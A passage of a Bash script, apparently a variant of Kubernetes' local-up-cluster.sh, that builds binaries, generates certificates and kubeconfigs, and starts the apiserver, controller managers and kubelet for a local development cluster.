doesn't exist\"\n        exit 1\n    fi\nfi\n# set feature gates if using ipvs mode\nif [ \"${KUBE_PROXY_MODE}\" == \"ipvs\" ]; then\n    # If required kernel modules are not available, fall back to iptables.\n    sudo modprobe -a ip_vs ip_vs_rr ip_vs_wrr ip_vs_sh nf_conntrack_ipv4\n    if [[ $? -eq 0 ]]; then\n      FEATURE_GATES=\"${FEATURE_GATES},SupportIPVSProxyMode=true\"\n    else\n      echo \"Required kernel modules for ipvs not found. Falling back to iptables mode.\"\n      KUBE_PROXY_MODE=iptables\n    fi\nfi\n# set feature gates if enable Pod priority and preemption\nif [ \"${ENABLE_POD_PRIORITY_PREEMPTION}\" == true ]; then\n    FEATURE_GATES=\"$FEATURE_GATES,PodPriority=true\"\nfi\n# warn if users are running with swap allowed\nif [ \"${FAIL_SWAP_ON}\" == \"false\" ]; then\n    echo \"WARNING : The kubelet is configured to not fail if swap is enabled; production deployments should disable swap.\"\nfi\nif [ \"$(id -u)\" != \"0\" ]; then\n    echo \"WARNING : This script MAY be run as root for docker socket / iptables functionality; if failures occur, retry as root.\" 2>&1\nfi\n# Stop right away if the build fails\nset -e\nsource \"${KUBE_ROOT}/hack/lib/init.sh\"\nfunction usage {\n            echo \"This script starts a local kube cluster. \"\n            echo \"Example 0: hack/local-up-cluster.sh -h  (this 'help' usage description)\"\n            echo \"Example 1: hack/local-up-cluster.sh -o _output/dockerized/bin/linux/amd64/ (run from docker output)\"\n            echo \"Example 2: hack/local-up-cluster.sh -O (auto-guess the bin path for your platform)\"\n            echo \"Example 3: hack/local-up-cluster.sh (build a local copy of the source)\"\n}\n# This function guesses where the existing cached binary build is for the `-O`\n# flag\nfunction guess_built_binary_path {\n  #local hyperkube_path=$(kube::util::find-binary \"hyperkube\")\n  local hyperkube_path=$(kube::util::find-binary \"kube-apiserver\")\n  if [[ -z \"${hyperkube_path}\" ]]; then\n    return\n  fi\n  echo -n \"$(dirname \"${hyperkube_path}\")\"\n}\n### Allow user to supply the source directory.\nGO_OUT=${GO_OUT:-}\nwhile getopts \"ho:O\" OPTION\ndo\n    case $OPTION in\n        o)\n            echo \"skipping build\"\n            GO_OUT=\"$OPTARG\"\n            echo \"using source $GO_OUT\"\n            ;;\n        O)\n            GO_OUT=$(guess_built_binary_path)\n            if [ \"$GO_OUT\" == \"\" ]; then\n                echo \"Could not guess the correct output directory to use.\"\n                exit 1\n            fi\n            ;;\n        h)\n            usage\n            exit\n            ;;\n        ?)\n            usage\n            exit\n            ;;\n    esac\ndone\nif [ \"x$GO_OUT\" == \"x\" ]; then\n    #make -C \"${KUBE_ROOT}\" WHAT=\"cmd/kubectl cmd/hyperkube\"\n    make -C \"${KUBE_ROOT}\" GOGCFLAGS=\"-N -l\" WHAT=\"cmd/kubectl cmd/kube-proxy cmd/kube-apiserver cmd/kube-controller-manager cmd/cloud-controller-manager cmd/kube-scheduler cmd/kubelet\"\nelse\n    echo \"skipped the build.\"\nfi\nfunction test_rkt {\n    if [[ -n \"${RKT_PATH}\" ]]; then\n      ${RKT_PATH} list 2> /dev/null 1> /dev/null\n      if [ \"$?\" != \"0\" ]; then\n        echo \"Failed to successfully run 'rkt list', please verify that ${RKT_PATH} is the path of rkt binary.\"\n        exit 1\n      fi\n    else\n      rkt list 2> /dev/null 1> /dev/null\n      if [ \"$?\" != \"0\" ]; then\n        echo \"Failed to successfully run 'rkt list', please verify that rkt is in \\$PATH.\"\n        exit 1\n      fi\n    fi\n}\n# Shut down anyway if there's an error.\nset +e\nAPI_PORT=${API_PORT:-8080}\nAPI_SECURE_PORT=${API_SECURE_PORT:-6443}\n# WARNING: For DNS to work on most setups you should export API_HOST as the docker0 ip address,\nAPI_HOST=${API_HOST:-localhost}\nAPI_HOST_IP=${API_HOST_IP:-\"127.0.0.1\"}\nADVERTISE_ADDRESS=${ADVERTISE_ADDRESS:-\"\"}\nAPI_BIND_ADDR=${API_BIND_ADDR:-\"0.0.0.0\"}\nEXTERNAL_HOSTNAME=${EXTERNAL_HOSTNAME:-localhost}\nKUBELET_HOST=${KUBELET_HOST:-\"127.0.0.1\"}\n# By default only allow CORS for requests on localhost\nAPI_CORS_ALLOWED_ORIGINS=${API_CORS_ALLOWED_ORIGINS:-/127.0.0.1(:[0-9]+)?$,/localhost(:[0-9]+)?$}\nKUBELET_PORT=${KUBELET_PORT:-10250}\nLOG_LEVEL=${LOG_LEVEL:-3}\n# Use to increase verbosity on particular files, e.g. LOG_SPEC=token_controller*=5,other_controller*=4\nLOG_SPEC=${LOG_SPEC:-\"\"}\nLOG_DIR=${LOG_DIR:-\"/tmp\"}\nCONTAINER_RUNTIME=${CONTAINER_RUNTIME:-\"docker\"}\nCONTAINER_RUNTIME_ENDPOINT=${CONTAINER_RUNTIME_ENDPOINT:-\"\"}\nIMAGE_SERVICE_ENDPOINT=${IMAGE_SERVICE_ENDPOINT:-\"\"}\nRKT_PATH=${RKT_PATH:-\"\"}\nRKT_STAGE1_IMAGE=${RKT_STAGE1_IMAGE:-\"\"}\nCHAOS_CHANCE=${CHAOS_CHANCE:-0.0}\nCPU_CFS_QUOTA=${CPU_CFS_QUOTA:-true}\nENABLE_HOSTPATH_PROVISIONER=${ENABLE_HOSTPATH_PROVISIONER:-\"false\"}\nCLAIM_BINDER_SYNC_PERIOD=${CLAIM_BINDER_SYNC_PERIOD:-\"15s\"} # current k8s default\nENABLE_CONTROLLER_ATTACH_DETACH=${ENABLE_CONTROLLER_ATTACH_DETACH:-\"true\"} # current default\nKEEP_TERMINATED_POD_VOLUMES=${KEEP_TERMINATED_POD_VOLUMES:-\"true\"}\n# This is the default dir and filename where the apiserver will generate a self-signed cert\n# which should be able to be used as the CA to verify itself\nCERT_DIR=${CERT_DIR:-\"/var/run/kubernetes\"}\nROOT_CA_FILE=${CERT_DIR}/server-ca.crt\nROOT_CA_KEY=${CERT_DIR}/server-ca.key\nCLUSTER_SIGNING_CERT_FILE=${CLUSTER_SIGNING_CERT_FILE:-\"${ROOT_CA_FILE}\"}\nCLUSTER_SIGNING_KEY_FILE=${CLUSTER_SIGNING_KEY_FILE:-\"${ROOT_CA_KEY}\"}\n# name of the cgroup driver, i.e. cgroupfs or systemd\nif [[ ${CONTAINER_RUNTIME} == \"docker\" ]]; then\n  # default cgroup driver to match what is reported by docker to simplify local development\n  if [[ -z ${CGROUP_DRIVER} ]]; then\n    # match driver with docker runtime reported value (they must match)\n    CGROUP_DRIVER=$(docker info | grep \"Cgroup Driver:\" | cut -f3- -d' ')\n    echo \"Kubelet cgroup driver defaulted to use: ${CGROUP_DRIVER}\"\n  fi\nfi\n# Ensure CERT_DIR is created for auto-generated crt/key and kubeconfig\nmkdir -p \"${CERT_DIR}\" &>/dev/null || sudo mkdir -p \"${CERT_DIR}\"\nCONTROLPLANE_SUDO=$(test -w \"${CERT_DIR}\" || echo \"sudo -E\")\nfunction test_apiserver_off {\n    # For the common local scenario, fail fast if server is already running.\n    # this can happen if you run local-up-cluster.sh twice and kill etcd in between.\n    if [[ \"${API_PORT}\" -gt \"0\" ]]; then\n        curl --silent -g $API_HOST:$API_PORT\n        if [ ! $? -eq 0 ]; then\n            echo \"API SERVER insecure port is free, proceeding...\"\n        else\n            echo \"ERROR starting API SERVER, exiting. Some process on $API_HOST is serving already on $API_PORT\"\n            exit 1\n        fi\n    fi\n    curl --silent -k -g $API_HOST:$API_SECURE_PORT\n    if [ ! $? -eq 0 ]; then\n        echo \"API SERVER secure port is free, proceeding...\"\n    else\n        echo \"ERROR starting API SERVER, exiting. Some process on $API_HOST is serving already on $API_SECURE_PORT\"\n        exit 1\n    fi\n}\nfunction detect_binary {\n    # Detect the OS name/arch so that we can find our binary\n    case \"$(uname -s)\" in\n      Darwin)\n        host_os=darwin\n        ;;\n      Linux)\n        host_os=linux\n        ;;\n      *)\n        echo \"Unsupported host OS.  Must be Linux or Mac OS X.\" >&2\n        exit 1\n        ;;\n    esac\n    case \"$(uname -m)\" in\n      x86_64*)\n        host_arch=amd64\n        ;;\n      i?86_64*)\n        host_arch=amd64\n        ;;\n      amd64*)\n        host_arch=amd64\n        ;;\n      aarch64*)\n        host_arch=arm64\n        ;;\n      arm64*)\n        host_arch=arm64\n        ;;\n      arm*)\n        host_arch=arm\n        ;;\n      i?86*)\n        host_arch=x86\n        ;;\n      s390x*)\n        host_arch=s390x\n        ;;\n      ppc64le*)\n        host_arch=ppc64le\n        ;;\n      *)\n        echo \"Unsupported host arch. Must be x86_64, 386, arm, arm64, s390x or ppc64le.\" >&2\n        exit 1\n        ;;\n    esac\n   GO_OUT=\"${KUBE_ROOT}/_output/local/bin/${host_os}/${host_arch}\"\n}\ncleanup_dockerized_kubelet()\n{\n  if [[ -e $KUBELET_CIDFILE ]]; then\n    docker kill $(<$KUBELET_CIDFILE) > /dev/null\n    rm -f $KUBELET_CIDFILE\n  fi\n}\ncleanup()\n{\n  echo \"Cleaning up...\"\n  # delete running images\n  # if [[ \"${ENABLE_CLUSTER_DNS}\" == true ]]; then\n  # Still need to figure why this commands throw an error: Error from server: client: etcd cluster is unavailable or misconfigured\n  #     ${KUBECTL} --namespace=kube-system delete service kube-dns\n  # And this one hang forever:\n  #     ${KUBECTL} --namespace=kube-system delete rc kube-dns-v10\n  # fi\n  # Check if the API server is still running\n  [[ -n \"${APISERVER_PID-}\" ]] && APISERVER_PIDS=$(pgrep -P ${APISERVER_PID} ; ps -o pid= -p ${APISERVER_PID})\n  [[ -n \"${APISERVER_PIDS-}\" ]] && sudo kill ${APISERVER_PIDS}\n  # Check if the controller-manager is still running\n  [[ -n \"${CTLRMGR_PID-}\" ]] && CTLRMGR_PIDS=$(pgrep -P ${CTLRMGR_PID} ; ps -o pid= -p ${CTLRMGR_PID})\n  [[ -n \"${CTLRMGR_PIDS-}\" ]] && sudo kill ${CTLRMGR_PIDS}\n  if [[ -n \"$DOCKERIZE_KUBELET\" ]]; then\n    cleanup_dockerized_kubelet\n  else\n    # Check if the kubelet is still running\n    [[ -n \"${KUBELET_PID-}\" ]] && KUBELET_PIDS=$(pgrep -P ${KUBELET_PID} ; ps -o pid= -p ${KUBELET_PID})\n    [[ -n \"${KUBELET_PIDS-}\" ]] && sudo kill ${KUBELET_PIDS}\n  fi\n  # Check if the proxy is still running\n  [[ -n \"${PROXY_PID-}\" ]] && PROXY_PIDS=$(pgrep -P ${PROXY_PID} ; ps -o pid= -p ${PROXY_PID})\n  [[ -n \"${PROXY_PIDS-}\" ]] && sudo kill ${PROXY_PIDS}\n  # Check if the scheduler is still running\n  [[ -n \"${SCHEDULER_PID-}\" ]] && SCHEDULER_PIDS=$(pgrep -P ${SCHEDULER_PID} ; ps -o pid= -p ${SCHEDULER_PID})\n  [[ -n \"${SCHEDULER_PIDS-}\" ]] && sudo kill ${SCHEDULER_PIDS}\n  # Check if the etcd is still running\n  [[ -n \"${ETCD_PID-}\" ]] && kube::etcd::stop\n  [[ -n \"${ETCD_DIR-}\" ]] && kube::etcd::clean_etcd_dir\n  exit 0\n}\nfunction warning {\n  message=$1\n  echo $(tput bold)$(tput setaf 1)\n  echo \"WARNING: ${message}\"\n  echo $(tput sgr0)\n}\nfunction start_etcd {\n    echo \"Starting etcd\"\n    kube::etcd::start\n}\nfunction set_service_accounts {\n    SERVICE_ACCOUNT_LOOKUP=${SERVICE_ACCOUNT_LOOKUP:-true}\n    SERVICE_ACCOUNT_KEY=${SERVICE_ACCOUNT_KEY:-/tmp/kube-serviceaccount.key}\n    # Generate ServiceAccount key if needed\n    if [[ ! -f \"${SERVICE_ACCOUNT_KEY}\" ]]; then\n      mkdir -p \"$(dirname ${SERVICE_ACCOUNT_KEY})\"\n      openssl genrsa -out \"${SERVICE_ACCOUNT_KEY}\" 2048 2>/dev/null\n    fi\n}\nfunction start_apiserver {\n    security_admission=\"\"\n    if [[ -n \"${DENY_SECURITY_CONTEXT_ADMISSION}\" ]]; then\n      security_admission=\",SecurityContextDeny\"\n    fi\n    if [[ -n \"${PSP_ADMISSION}\" ]]; then\n      security_admission=\",PodSecurityPolicy\"\n    fi\n    if [[ -n \"${NODE_ADMISSION}\" ]]; then\n      security_admission=\",NodeRestriction\"\n    fi\n    if [ \"${ENABLE_POD_PRIORITY_PREEMPTION}\" == true ]; then\n      security_admission=\",Priority\"\n      if [[ -n \"${RUNTIME_CONFIG}\" ]]; then\n          RUNTIME_CONFIG+=\",\"\n      fi\n      RUNTIME_CONFIG+=\"scheduling.k8s.io/v1alpha1=true\"\n    fi\n    # Admission Controllers to invoke prior to persisting objects in cluster\n    #\n    # The order defined here dose not matter.\n    ENABLE_ADMISSION_PLUGINS=LimitRanger,ServiceAccount${security_admission},DefaultStorageClass,DefaultTolerationSeconds,MutatingAdmissionWebhook,ValidatingAdmissionWebhook,ResourceQuota,PodPreset,StorageObjectInUseProtection\n    audit_arg=\"\"\n    APISERVER_BASIC_AUDIT_LOG=\"\"\n    if [[ \"${ENABLE_APISERVER_BASIC_AUDIT:-}\" = true ]]; then\n        # We currently only support enabling with a fixed path and with built-in log\n        # rotation \"disabled\" (large value) so it behaves like kube-apiserver.log.\n        # External log rotation should be set up the same as for kube-apiserver.log.\n        APISERVER_BASIC_AUDIT_LOG=/tmp/kube-apiserver-audit.log\n        audit_arg=\" --audit-log-path=${APISERVER_BASIC_AUDIT_LOG}\"\n        audit_arg+=\" --audit-log-maxage=0\"\n        audit_arg+=\" --audit-log-maxbackup=0\"\n        # Lumberjack doesn't offer any way to disable size-based rotation. It also\n        # has an in-memory counter that doesn't notice if you truncate the file.\n        # 2000000000 (in MiB) is a large number that fits in 31 bits. If the log\n        # grows at 10MiB/s (~30K QPS), it will rotate after ~6 years if apiserver\n        # never restarts. Please manually restart apiserver before this time.\n        audit_arg+=\" --audit-log-maxsize=2000000000\"\n    fi\n    swagger_arg=\"\"\n    if [[ \"${ENABLE_SWAGGER_UI}\" = true ]]; then\n      swagger_arg=\"--enable-swagger-ui=true \"\n    fi\n    authorizer_arg=\"\"\n    if [[ -n \"${AUTHORIZATION_MODE}\" ]]; then\n      authorizer_arg=\"--authorization-mode=${AUTHORIZATION_MODE} \"\n    fi\n    priv_arg=\"\"\n    if [[ -n \"${ALLOW_PRIVILEGED}\" ]]; then\n      priv_arg=\"--allow-privileged \"\n    fi\n    if [[ ${ENABLE_ADMISSION_PLUGINS} == *\"Initializers\"* ]]; then\n        if [[ -n \"${RUNTIME_CONFIG}\" ]]; then\n          RUNTIME_CONFIG+=\",\"\n        fi\n        RUNTIME_CONFIG+=\"admissionregistration.k8s.io/v1alpha1\"\n    fi\n    if [[ ${ENABLE_ADMISSION_PLUGINS} == *\"PodPreset\"* ]]; then\n        if [[ -n \"${RUNTIME_CONFIG}\" ]]; then\n            RUNTIME_CONFIG+=\",\"\n        fi\n        RUNTIME_CONFIG+=\"settings.k8s.io/v1alpha1\"\n    fi\n    runtime_config=\"\"\n    if [[ -n \"${RUNTIME_CONFIG}\" ]]; then\n      runtime_config=\"--runtime-config=${RUNTIME_CONFIG}\"\n    fi\n    # Let the API server pick a default address when API_HOST_IP\n    # is set to 127.0.0.1\n    advertise_address=\"\"\n    if [[ \"${API_HOST_IP}\" != \"127.0.0.1\" ]]; then\n        advertise_address=\"--advertise-address=${API_HOST_IP}\"\n    fi\n    if [[ \"${ADVERTISE_ADDRESS}\" != \"\" ]] ; then\n        advertise_address=\"--advertise-address=${ADVERTISE_ADDRESS}\"\n    fi\n    # Create CA signers\n    if [[ \"${ENABLE_SINGLE_CA_SIGNER:-}\" = true ]]; then\n        kube::util::create_signing_certkey \"${CONTROLPLANE_SUDO}\" \"${CERT_DIR}\" server '\"client auth\",\"server auth\"'\n        sudo cp \"${CERT_DIR}/server-ca.key\" \"${CERT_DIR}/client-ca.key\"\n        sudo cp \"${CERT_DIR}/server-ca.crt\" \"${CERT_DIR}/client-ca.crt\"\n        sudo cp \"${CERT_DIR}/server-ca-config.json\" \"${CERT_DIR}/client-ca-config.json\"\n    else\n        kube::util::create_signing_certkey \"${CONTROLPLANE_SUDO}\" \"${CERT_DIR}\" server '\"server auth\"'\n        kube::util::create_signing_certkey \"${CONTROLPLANE_SUDO}\" \"${CERT_DIR}\" client '\"client auth\"'\n    fi\n    # Create auth proxy client ca\n    kube::util::create_signing_certkey \"${CONTROLPLANE_SUDO}\" \"${CERT_DIR}\" request-header '\"client auth\"'\n    # serving cert for kube-apiserver\n    kube::util::create_serving_certkey \"${CONTROLPLANE_SUDO}\" \"${CERT_DIR}\" \"server-ca\" kube-apiserver kubernetes.default kubernetes.default.svc \"localhost\" ${API_HOST_IP} ${API_HOST} ${FIRST_SERVICE_CLUSTER_IP}\n    # Create client certs signed with client-ca, given id, given CN and a number of groups\n    kube::util::create_client_certkey \"${CONTROLPLANE_SUDO}\" \"${CERT_DIR}\" 'client-ca' kubelet system:node:${HOSTNAME_OVERRIDE} system:nodes\n    kube::util::create_client_certkey \"${CONTROLPLANE_SUDO}\" \"${CERT_DIR}\" 'client-ca' kube-proxy system:kube-proxy system:nodes\n    kube::util::create_client_certkey \"${CONTROLPLANE_SUDO}\" \"${CERT_DIR}\" 'client-ca' controller system:kube-controller-manager\n    kube::util::create_client_certkey \"${CONTROLPLANE_SUDO}\" \"${CERT_DIR}\" 'client-ca' scheduler  system:kube-scheduler\n    kube::util::create_client_certkey \"${CONTROLPLANE_SUDO}\" \"${CERT_DIR}\" 'client-ca' admin system:admin system:masters\n    # Create matching certificates for kube-aggregator\n    kube::util::create_serving_certkey \"${CONTROLPLANE_SUDO}\" \"${CERT_DIR}\" \"server-ca\" kube-aggregator api.kube-public.svc \"localhost\" ${API_HOST_IP}\n    kube::util::create_client_certkey \"${CONTROLPLANE_SUDO}\" \"${CERT_DIR}\" request-header-ca auth-proxy system:auth-proxy\n    # TODO remove masters and add rolebinding\n    kube::util::create_client_certkey \"${CONTROLPLANE_SUDO}\" \"${CERT_DIR}\" 'client-ca' kube-aggregator system:kube-aggregator system:masters\n    kube::util::write_client_kubeconfig \"${CONTROLPLANE_SUDO}\" \"${CERT_DIR}\" \"${ROOT_CA_FILE}\" \"${API_HOST}\" \"${API_SECURE_PORT}\" kube-aggregator\n    cloud_config_arg=\"--cloud-provider=${CLOUD_PROVIDER} --cloud-config=${CLOUD_CONFIG}\"\n    if [[ \"${EXTERNAL_CLOUD_PROVIDER:-}\" == \"true\" ]]; then\n      cloud_config_arg=\"--cloud-provider=external\"\n    fi\n    APISERVER_LOG=${LOG_DIR}/kube-apiserver.log\n    #${CONTROLPLANE_SUDO} \"${GO_OUT}/hyperkube\" apiserver ${swagger_arg} ${audit_arg} ${authorizer_arg} ${priv_arg} ${runtime_config} \\\n    ${CONTROLPLANE_SUDO} \"${GO_OUT}/kube-apiserver\" ${swagger_arg} ${audit_arg} ${authorizer_arg} ${priv_arg} ${runtime_config} \\\n      ${cloud_config_arg} \\\n      ${advertise_address} \\\n      --v=${LOG_LEVEL} \\\n      --vmodule=\"${LOG_SPEC}\" \\\n      --cert-dir=\"${CERT_DIR}\" \\\n      --client-ca-file=\"${CERT_DIR}/client-ca.crt\" \\\n      --service-account-key-file=\"${SERVICE_ACCOUNT_KEY}\" \\\n      --service-account-lookup=\"${SERVICE_ACCOUNT_LOOKUP}\" \\\n      --enable-admission-plugins=\"${ENABLE_ADMISSION_PLUGINS}\" \\\n      --disable-admission-plugins=\"${DISABLE_ADMISSION_PLUGINS}\" \\\n      --admission-control-config-file=\"${ADMISSION_CONTROL_CONFIG_FILE}\" \\\n      --bind-address=\"${API_BIND_ADDR}\" \\\n      --secure-port=\"${API_SECURE_PORT}\" \\\n      --tls-cert-file=\"${CERT_DIR}/serving-kube-apiserver.crt\" \\\n      --tls-private-key-file=\"${CERT_DIR}/serving-kube-apiserver.key\" \\\n      --insecure-bind-address=\"${API_HOST_IP}\" \\\n      --insecure-port=\"${API_PORT}\" \\\n      --storage-backend=${STORAGE_BACKEND} \\\n      --etcd-servers=\"http://${ETCD_HOST}:${ETCD_PORT}\" \\\n      --service-cluster-ip-range=\"${SERVICE_CLUSTER_IP_RANGE}\" \\\n      --feature-gates=\"${FEATURE_GATES}\" \\\n      --external-hostname=\"${EXTERNAL_HOSTNAME}\" \\\n      --requestheader-username-headers=X-Remote-User \\\n      --requestheader-group-headers=X-Remote-Group \\\n      --requestheader-extra-headers-prefix=X-Remote-Extra- \\\n      --requestheader-client-ca-file=\"${CERT_DIR}/request-header-ca.crt\" \\\n      --requestheader-allowed-names=system:auth-proxy \\\n      --proxy-client-cert-file=\"${CERT_DIR}/client-auth-proxy.crt\" \\\n      --proxy-client-key-file=\"${CERT_DIR}/client-auth-proxy.key\" \\\n      --cors-allowed-origins=\"${API_CORS_ALLOWED_ORIGINS}\" >\"${APISERVER_LOG}\" 2>&1 &\n    APISERVER_PID=$!\n    # Wait for kube-apiserver to come up before launching the rest of the components.\n    echo \"Waiting for apiserver to come up\"\n    # this uses the API port because if you don't have any authenticator, you can't seem to use the secure port at all.\n    # this matches what happened with the combination in 1.4.\n    # TODO change this conditionally based on whether API_PORT is on or off\n    kube::util::wait_for_url \"https://${API_HOST_IP}:${API_SECURE_PORT}/healthz\" \"apiserver: \" 1 ${WAIT_FOR_URL_API_SERVER} \\\n        || { echo \"check apiserver logs: ${APISERVER_LOG}\" ; exit 1 ; }\n    # Create kubeconfigs for all components, using client certs\n    kube::util::write_client_kubeconfig \"${CONTROLPLANE_SUDO}\" \"${CERT_DIR}\" \"${ROOT_CA_FILE}\" \"${API_HOST}\" \"${API_SECURE_PORT}\" admin\n    ${CONTROLPLANE_SUDO} chown \"${USER}\" \"${CERT_DIR}/client-admin.key\" # make readable for kubectl\n    kube::util::write_client_kubeconfig \"${CONTROLPLANE_SUDO}\" \"${CERT_DIR}\" \"${ROOT_CA_FILE}\" \"${API_HOST}\" \"${API_SECURE_PORT}\" kubelet\n    kube::util::write_client_kubeconfig \"${CONTROLPLANE_SUDO}\" \"${CERT_DIR}\" \"${ROOT_CA_FILE}\" \"${API_HOST}\" \"${API_SECURE_PORT}\" kube-proxy\n    kube::util::write_client_kubeconfig \"${CONTROLPLANE_SUDO}\" \"${CERT_DIR}\" \"${ROOT_CA_FILE}\" \"${API_HOST}\" \"${API_SECURE_PORT}\" controller\n    kube::util::write_client_kubeconfig \"${CONTROLPLANE_SUDO}\" \"${CERT_DIR}\" \"${ROOT_CA_FILE}\" \"${API_HOST}\" \"${API_SECURE_PORT}\" scheduler\n    if [[ -z \"${AUTH_ARGS}\" ]]; then\n        AUTH_ARGS=\"--client-key=${CERT_DIR}/client-admin.key --client-certificate=${CERT_DIR}/client-admin.crt\"\n    fi\n    ${CONTROLPLANE_SUDO} cp \"${CERT_DIR}/admin.kubeconfig\" \"${CERT_DIR}/admin-kube-aggregator.kubeconfig\"\n    ${CONTROLPLANE_SUDO} chown $(whoami) \"${CERT_DIR}/admin-kube-aggregator.kubeconfig\"\n    ${KUBECTL} config set-cluster local-up-cluster --kubeconfig=\"${CERT_DIR}/admin-kube-aggregator.kubeconfig\" --server=\"https://${API_HOST_IP}:31090\"\n    echo \"use 'kubectl --kubeconfig=${CERT_DIR}/admin-kube-aggregator.kubeconfig' to use the aggregated API server\"\n}\nfunction start_controller_manager {\n    node_cidr_args=\"\"\n    if [[ \"${NET_PLUGIN}\" == \"kubenet\" ]]; then\n      node_cidr_args=\"--allocate-node-cidrs=true --cluster-cidr=10.1.0.0/16 \"\n    fi\n    cloud_config_arg=\"--cloud-provider=${CLOUD_PROVIDER} --cloud-config=${CLOUD_CONFIG}\"\n    if [[ \"${EXTERNAL_CLOUD_PROVIDER:-}\" == \"true\" ]]; then\n      cloud_config_arg=\"--cloud-provider=external\"\n      cloud_config_arg+=\" --external-cloud-volume-plugin=${CLOUD_PROVIDER}\"\n      cloud_config_arg+=\" --cloud-config=${CLOUD_CONFIG}\"\n    fi\n    CTLRMGR_LOG=${LOG_DIR}/kube-controller-manager.log\n    #${CONTROLPLANE_SUDO} \"${GO_OUT}/hyperkube\" controller-manager \\\n    ${CONTROLPLANE_SUDO} \"${GO_OUT}/kube-controller-manager\" \\\n      --v=${LOG_LEVEL} \\\n      --vmodule=\"${LOG_SPEC}\" \\\n      --service-account-private-key-file=\"${SERVICE_ACCOUNT_KEY}\" \\\n      --root-ca-file=\"${ROOT_CA_FILE}\" \\\n      --cluster-signing-cert-file=\"${CLUSTER_SIGNING_CERT_FILE}\" \\\n      --cluster-signing-key-file=\"${CLUSTER_SIGNING_KEY_FILE}\" \\\n      --enable-hostpath-provisioner=\"${ENABLE_HOSTPATH_PROVISIONER}\" \\\n      ${node_cidr_args} \\\n      --pvclaimbinder-sync-period=\"${CLAIM_BINDER_SYNC_PERIOD}\" \\\n      --feature-gates=\"${FEATURE_GATES}\" \\\n      ${cloud_config_arg} \\\n      --kubeconfig \"$CERT_DIR\"/controller.kubeconfig \\\n      --use-service-account-credentials \\\n      --controllers=\"${KUBE_CONTROLLERS}\" \\\n      --master=\"https://${API_HOST}:${API_SECURE_PORT}\" >\"${CTLRMGR_LOG}\" 2>&1 &\n    CTLRMGR_PID=$!\n}\nfunction start_cloud_controller_manager {\n    if [ -z \"${CLOUD_CONFIG}\" ]; then\n      echo \"CLOUD_CONFIG cannot be empty!\"\n      exit 1\n    fi\n    if [ ! -f \"${CLOUD_CONFIG}\" ]; then\n      echo \"Cloud config ${CLOUD_CONFIG} doesn't exist\"\n      exit 1\n    fi\n    node_cidr_args=\"\"\n    if [[ \"${NET_PLUGIN}\" == \"kubenet\" ]]; then\n      node_cidr_args=\"--allocate-node-cidrs=true --cluster-cidr=10.1.0.0/16 \"\n    fi\n    CLOUD_CTLRMGR_LOG=${LOG_DIR}/cloud-controller-manager.log\n    #${CONTROLPLANE_SUDO} ${EXTERNAL_CLOUD_PROVIDER_BINARY:-\"${GO_OUT}/hyperkube\" cloud-controller-manager} \\\n    ${CONTROLPLANE_SUDO} ${EXTERNAL_CLOUD_PROVIDER_BINARY:-\"${GO_OUT}/cloud-controller-manager\"} \\\n      --v=${LOG_LEVEL} \\\n      --vmodule=\"${LOG_SPEC}\" \\\n      ${node_cidr_args} \\\n      --feature-gates=\"${FEATURE_GATES}\" \\\n      --cloud-provider=${CLOUD_PROVIDER} \\\n      --cloud-config=${CLOUD_CONFIG} \\\n      --kubeconfig \"$CERT_DIR\"/controller.kubeconfig \\\n      --use-service-account-credentials \\\n      --master=\"https://${API_HOST}:${API_SECURE_PORT}\" >\"${CLOUD_CTLRMGR_LOG}\" 2>&1 &\n    CLOUD_CTLRMGR_PID=$!\n}\nfunction start_kubelet {\n    KUBELET_LOG=${LOG_DIR}/kubelet.log\n    mkdir -p \"${POD_MANIFEST_PATH}\" &>/dev/null || sudo mkdir -p \"${POD_MANIFEST_PATH}\"\n    priv_arg=\"\"\n    if [[ -n \"${ALLOW_PRIVILEGED}\" ]]; then\n      priv_arg=\"--allow-privileged \"\n    fi\n    cloud_config_arg=\"--cloud-provider=${CLOUD_PROVIDER} --cloud-config=${CLOUD_CONFIG}\"\n    if [[ \"${EXTERNAL_CLOUD_PROVIDER:-}\" == \"true\" ]]; then\n       cloud_config_arg=\"--cloud-provider=external\"\n       cloud_config_arg+=\" --provider-id=$(hostname)\"\n    fi\n    mkdir -p \"/var/lib/kubelet\" &>/dev/null || sudo mkdir -p \"/var/lib/kubelet\"\n    if [[ -z \"${DOCKERIZE_KUBELET}\" ]]; then\n      # Enable dns\n      if [[ \"${ENABLE_CLUSTER_DNS}\" = true ]]; then\n         dns_args=\"--cluster-dns=${DNS_SERVER_IP} --cluster-domain=${DNS_DOMAIN}\"\n      else\n         # To start a private DNS server set ENABLE_CLUSTER_DNS and\n         # DNS_SERVER_IP/DOMAIN. This will at least provide a working\n         # DNS server for real world hostnames.\n         dns_args=\"--cluster-dns=8.8.8.8\"\n      fi\n      net_plugin_args=\"\"\n      if [[ -n \"${NET_PLUGIN}\" ]]; then\n        net_plugin_args=\"--network-plugin=${NET_PLUGIN}\"\n      fi\n      auth_args=\"\"\n      if [[ -n \"${KUBELET_AUTHORIZATION_WEBHOOK:-}\" ]]; then\n        auth_args=\"${auth_args} --authorization-mode=Webhook\"\n      fi\n      if [[ -n \"${KUBELET_AUTHENTICATION_WEBHOOK:-}\" ]]; then\n        auth_args=\"${auth_args} --authentication-token-webhook\"\n      fi\n      if [[ -n \"${CLIENT_CA_FILE:-}\" ]]; then\n        auth_args=\"${auth_args} --client-ca-file=${CLIENT_CA_FILE}\"\n      fi\n      cni_conf_dir_args=\"\"\n      if [[ -n \"${CNI_CONF_DIR}\" ]]; then\n        cni_conf_dir_args=\"--cni-conf-dir=${CNI_CONF_DIR}\"\n      fi\n      cni_bin_dir_args=\"\"\n      if [[ -n \"${CNI_BIN_DIR}\" ]]; then\n        cni_bin_dir_args=\"--cni-bin-dir=${CNI_BIN_DIR}\"\n      fi\n      container_runtime_endpoint_args=\"\"\n      if [[ -n \"${CONTAINER_RUNTIME_ENDPOINT}\" ]]; then\n        container_runtime_endpoint_args=\"--container-runtime-endpoint=${CONTAINER_RUNTIME_ENDPOINT}\"\n      fi\n      image_service_endpoint_args=\"\"\n      if [[ -n \"${IMAGE_SERVICE_ENDPOINT}\" ]]; then\n        image_service_endpoint_args=\"--image-service-endpoint=${IMAGE_SERVICE_ENDPOINT}\"\n      fi\n      #sudo -E \"${GO_OUT}/hyperkube\" kubelet ${priv_arg}\\\n      sudo -E \"${GO_OUT}/kubelet\" ${priv_arg}\\\n        --v=${LOG_LEVEL} \\\n        --vmodule=\"${LOG_SPEC}\" \\\n        --chaos-chance=\"${CHAOS_CHANCE}\" \\\n        --container-runtime=\"${CONTAINER_RUNTIME}\" \\\n\t--fail-swap-on=false \\\n        #--rkt-path=\"${RKT_PATH}\" 